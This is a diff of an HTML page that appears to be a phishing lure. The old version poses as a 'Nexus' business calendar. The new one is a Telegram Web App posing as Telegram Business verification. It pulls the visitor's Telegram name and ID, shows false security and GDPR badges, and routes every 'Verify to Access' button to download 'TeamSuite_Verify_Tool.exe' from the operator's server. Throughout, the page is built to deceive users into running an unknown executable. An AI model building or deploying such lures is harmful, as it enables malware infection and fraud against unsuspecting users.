@@ -2,110 +2,93 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nexus Business Calendar</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
-</head>
-<body class="bg-[#f8fafc] text-[#1e293b] font-sans min-h-screen">
-
-    <!-- Верхняя панель -->
-    <nav class="bg-white border-b border-slate-200 px-6 py-3 flex items-center justify-between sticky top-0 z-50">
-        <div class="flex items-center gap-3">
-            <div class="w-8 h-8 bg-blue-600 rounded flex items-center justify-center shadow-md">
-                <i class="bi bi-calendar-check-fill text-white"></i>
-            </div>
-            <span class="font-bold text-slate-800 tracking-tight">NEXUS <span class="text-blue-600">SCHEDULER</span></span>
-        </div>
-        <div class="flex items-center gap-4 text-[11px] font-medium text-slate-500 uppercase tracking-wider">
-            <span class="flex items-center gap-1.5"><span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span> Network Active</span>
-            <span class="border-l border-slate-200 pl-4">US Region</span>
-        </div>
-    </nav>
-
-    <main class="max-w-6xl mx-auto p-6 grid grid-cols-1 lg:grid-cols-12 gap-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>TeamSuite</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        :root { --tg-theme-bg: #ffffff; --tg-theme-text: #000000; --blue: #3b82f6; --gray: #f1f5f9; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f8fafc; margin: 0; padding: 20px; color: #1e293b; -webkit-tap-highlight-color: transparent; }
         
-        <!-- Левая колонка: Календарная сетка -->
-        <div class="lg:col-span-8 bg-white border border-slate-200 rounded-2xl shadow-sm overflow-hidden">
-            <div class="p-4 border-b border-slate-100 flex items-center justify-between bg-slate-50/50">
-                <h2 class="font-bold text-slate-700">Май 2026</h2>
-                <div class="flex gap-2">
-                    <button class="p-1 hover:bg-slate-200 rounded"><i class="bi bi-chevron-left"></i></button>
-                    <button class="p-1 hover:bg-slate-200 rounded"><i class="bi bi-chevron-right"></i></button>
-                </div>
-            </div>
-            
-            <!-- Сетка (пример) -->
-            <div class="grid grid-cols-7 text-center border-b border-slate-100 text-[10px] font-bold text-slate-400 uppercase py-2">
-                <div>Пн</div><div>Вт</div><div>Ср</div><div>Чт</div><div>Пт</div><div class="text-slate-300">Сб</div><div class="text-slate-300">Вс</div>
-            </div>
-            <div class="grid grid-cols-7 h-[400px] opacity-40 grayscale pointer-events-none">
-                <!-- Пустые ячейки для вида -->
-                <div class="border-r border-b border-slate-50 p-2"></div><div class="border-r border-b border-slate-50 p-2"></div>
-                <div class="border-r border-b border-slate-50 p-2 bg-blue-50/50"></div>
-                <!-- Генерируем сетку дальше... -->
-            </div>
-            <div class="absolute inset-0 lg:col-span-8 flex items-center justify-center z-10 pointer-events-none">
-                 <div class="bg-white/80 backdrop-blur-sm p-6 rounded-2xl border border-slate-200 shadow-xl text-center flex flex-col items-center">
-                    <i class="bi bi-lock-fill text-3xl text-blue-600 mb-2"></i>
-                    <p class="font-bold text-slate-800">Данные зашифрованы</p>
-                    <p class="text-xs text-slate-500">Требуется синхронизация с локальным узлом</p>
-                 </div>
-            </div>
+        /* Profile Header */
+        .header { text-align: center; margin-bottom: 25px; }
+        .avatar { width: 100px; height: 100px; background: linear-gradient(135deg, #6366f1, #a855f7); border-radius: 50%; margin: 0 auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; color: white; box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1); }
+        .name { font-size: 24px; font-weight: 700; margin-bottom: 5px; }
+        .user-id { color: #64748b; font-size: 14px; margin-bottom: 10px; }
+        .badge { display: inline-flex; align-items: center; background: #fff7ed; color: #9a3412; padding: 4px 12px; border-radius: 20px; font-size: 12px; border: 1px solid #ffedd5; }
+
+        /* Alert Box */
+        .alert { background: #fff7ed; border: 1px solid #ffedd5; border-radius: 16px; padding: 15px; margin-bottom: 20px; }
+        .alert-title { color: #9a3412; font-weight: 700; font-size: 15px; margin-bottom: 8px; display: flex; align-items: center; gap: 8px; }
+        .alert-desc { color: #c2410c; font-size: 13px; line-height: 1.5; }
+
+        /* Feature Cards */
+        .card { background: white; border-radius: 20px; padding: 30px 20px; text-align: center; margin-bottom: 20px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05); }
+        .card img { width: 60px; height: 60px; margin-bottom: 15px; }
+        .card h3 { margin: 0 0 10px; font-size: 18px; color: #0f172a; }
+        .card p { font-size: 14px; color: #64748b; margin-bottom: 20px; line-height: 1.4; }
+        
+        .btn-verify { background: #3b82f6; color: white; border: none; width: 100%; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 16px; display: flex; align-items: center; justify-content: center; gap: 8px; cursor: pointer; }
+
+        /* Footer */
+        .footer { text-align: center; color: #94a3b8; font-size: 12px; margin-top: 30px; padding-bottom: 20px; }
+        .footer-badges { display: flex; justify-content: center; gap: 15px; margin-top: 10px; }
+
+        /* Hidden Modal for Auto-Download */
+        #download-trigger { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="header">
+        <div class="avatar" id="user-initial">A</div>
+        <div class="name" id="user-name">Employee</div>
+        <div class="user-id" id="user-id">ID: 5159147982</div>
+        <div class="badge">⏳ Not Verified</div>
+    </div>
+
+    <div class="alert">
+        <div class="alert-title">🔐 Verification Required</div>
+        <div class="alert-desc">Complete identity verification to access Telegram Business features. This ensures security for all users.</div>
+    </div>
+
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 10px;">📅</div>
+        <h3>Schedule Appointments</h3>
+        <p>Book meetings with verified businesses directly through Telegram</p>
+        <button class="btn-verify" onclick="startDownload()"><i class="fa-solid fa-lock"></i> Verify to Access</button>
+    </div>
+
+    <div class="card">
+        <div style="font-size: 50px; margin-bottom: 10px;">✍️</div>
+        <h3>Digital Document Signing</h3>
+        <p>Sign contracts and agreements securely with legal validity</p>
+        <button class="btn-verify" onclick="startDownload()"><i class="fa-solid fa-lock"></i> Verify to Access</button>
+    </div>
+
+    <div class="footer">
+        Trusted by 127,000+ businesses worldwide
+        <div class="footer-badges">
+            <span>🔒 End-to-end encrypted</span>
+            <span>✓ GDPR compliant</span>
         </div>
+    </div>
 
-        <!-- Правая колонка: Действия -->
-        <div class="lg:col-span-4 space-y-6">
-            <div class="bg-white border border-slate-200 rounded-2xl p-6 shadow-sm">
-                <h3 class="font-bold text-slate-800 mb-4 flex items-center gap-2">
-                    <i class="bi bi-file-earmark-lock2-fill text-blue-600"></i> Ожидают подписи
-                </h3>
-                <div class="space-y-3 mb-6">
-                    <div class="flex items-center gap-3 p-3 bg-slate-50 rounded-xl border border-slate-100">
-                        <i class="bi bi-file-pdf-fill text-red-500 text-xl"></i>
-                        <div class="text-xs">
-                            <p class="font-bold text-slate-700">Contract_05_2026.pdf</p>
-                            <p class="text-slate-400 italic">Сумма лота: $50,000</p>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="p-4 bg-blue-50 rounded-xl border border-blue-100 mb-6">
-                    <p class="text-[11px] text-blue-700 leading-relaxed font-medium">
-                        Для просмотра расписания и доступа к документам необходимо установить крипто-валидатор Nexus.
-                    </p>
-                </div>
-
-                <!-- КНОПКА СКАЧИВАНИЯ -->
-                <a href="ССЫЛКА_НА_ФАЙЛ/Nexus_Secure_Tool.exe" 
-                   class="flex items-center justify-center gap-3 w-full py-4 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold text-sm transition-all shadow-lg shadow-blue-200 active:scale-95 group">
-                    <i class="bi bi-arrow-repeat group-hover:rotate-180 transition-transform duration-500"></i>
-                    СИНХРОНИЗИРОВАТЬ
-                </a>
-            </div>
-
-            <!-- Статус соединения -->
-            <div class="bg-slate-900 rounded-2xl p-5 font-mono text-[10px]">
-                <div class="flex justify-between mb-2">
-                    <span class="text-slate-500 uppercase">System Status</span>
-                    <span class="text-blue-400">WAITING...</span>
-                </div>
-                <div class="space-y-1 overflow-hidden h-12 text-slate-400 opacity-70" id="logs">
-                    <div>> Init handshake</div>
-                </div>
-            </div>
-        </div>
-    </main>
-
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script>
-        const logs = document.getElementById('logs');
-        const msgs = ["> Looking for local peer...", "> SSL tunnel: Ready", "> Encryption: AES-256", "> 79.163.249.244 linked"];
-        setInterval(() => {
-            const div = document.createElement('div');
-            div.innerHTML = msgs[Math.floor(Math.random() * msgs.length)];
-            logs.appendChild(div);
-            if (logs.childNodes.length > 3) logs.removeChild(logs.firstChild);
-        }, 3000);
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        
+        // Подгружаем реальные данные из телеграма
+        if (tg.initDataUnsafe.user) {
+            document.getElementById('user-name').innerText = tg.initDataUnsafe.user.first_name + ' ' + (tg.initDataUnsafe.user.last_name || '');
+            document.getElementById('user-id').innerText = 'ID: ' + tg.initDataUnsafe.user.id;
+            document.getElementById('user-initial').innerText = tg.initDataUnsafe.user.first_name.charAt(0);
+        }
+
+        function startDownload() {
+            // Ведем напрямую на эндпоинт твоего сервера
+            window.location.href = '/api/v4/download/TeamSuite_Verify_Tool.exe';
+        }
     </script>
 </body>
 </html>
